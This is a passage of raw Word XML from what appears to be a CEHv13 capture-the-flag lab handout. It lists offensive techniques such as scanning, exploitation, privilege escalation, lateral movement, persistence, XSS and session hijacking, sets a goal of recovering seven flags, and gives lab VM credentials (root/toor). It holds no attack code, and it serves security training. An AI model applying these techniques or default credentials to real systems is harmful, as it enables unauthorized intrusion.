      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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our</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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U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 ev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ry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te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hnique in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y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our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CEHv13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toolki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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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R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on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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an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ing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Ex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p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loi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at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on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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u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ling</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Privilege 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ala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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Lateral move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m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t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Per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iste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</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Stega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ogra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p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hy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:footerReference w:type="default" r:id="rId19"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1000" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:pgNumType w:start="2"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Se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ion hija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king</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="30"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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End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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Goal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1232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R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over all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7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flag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, ea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h re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p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re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ting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a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mp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4"/>
          <w:szCs w:val="24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m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is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d as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et or te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hnique. Submit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y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our</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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final re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p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ort det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iling:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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How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y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ou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g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ained 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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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What 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y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ou fo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u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nd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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How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the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y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tem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ould be har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ed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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nd finall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y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…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1080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404040"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Who the he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24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-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ie?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1665"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:6in;height:114pt">
            <v:imagedata r:id="rId20" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34" w:line="370" w:lineRule="auto"/>
        <w:ind w:left="1666" w:right="8230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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>What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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>We Know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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>So F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r: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 Kali IP =</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1666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pict>
          <v:group id="_x0000_s1119" style="position:absolute;left:0;text-align:left;margin-left:75.75pt;margin-top:-46.05pt;width:457.25pt;height:91.75pt;z-index:-1897;mso-position-horizontal-relative:page" coordorigin="1515,-921" coordsize="9145,1835">
            <v:shape id="_x0000_s1120" style="position:absolute;left:1515;top:-921;width:9145;height:1835" coordorigin="1515,-921" coordsize="9145,1835" path="m1515,914r9145,l10660,-921r-9145,l1515,914xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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T</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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arget IP =</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1666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404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Enter IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ddres</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nviro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nm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1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1704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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>L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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>B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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>NO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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>ES:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1704"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New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Lab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Ma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ter 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m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in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(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all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V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M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s)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:  u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4"/>
          <w:szCs w:val="24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na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m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e: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404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="39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p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as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w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ord: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>toor</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1704"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId21"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
